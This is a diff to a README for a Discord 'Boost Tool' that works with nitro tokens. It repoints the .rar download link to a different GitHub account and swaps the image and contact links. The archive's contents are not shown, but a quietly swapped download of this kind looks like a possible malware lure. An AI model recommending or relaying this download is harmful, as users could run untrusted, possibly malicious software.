@@ -6,20 +6,16 @@
   Remember This Boost Tool ONLY allows you to boost servers if you have nitro tokens!
 </h2>
 <h2 align="center">
-  <a href="https://github.com/celgz/Boost-Bot/releases/download/Discord-Boost-Tool/KARMA-Boost-Tool.rar">DOWNLOAD</a>
+  <a href="https://github.com/internalvpn/Boost-Bot/releases/download/Discord-Boost-Tool/KARMA-Boost-Tool.rar">DOWNLOAD</a>
 </h2>
 
-<h3 align="center">
-<a href="https://discord.gg/gui">JOIN THE DISCORD SERVER</a>
-</h3>
-
-![image](https://cdn.discordapp.com/attachments/1154132686642888756/1154490383330451568/image.png) 
+![image](https://i.ibb.co/cN6QwD3/ima3434ge.webp) 
 
 <h3 align="center">
 Please ⭐ This Repo If You Like It!
 </h3>
 <h3 align="center">
-<a href="https://guns.lol/opsec">CONTACT ME HERE</a>
+<a href="https://guns.lol/solve">CONTACT ME HERE</a>
 </h3>
 
 
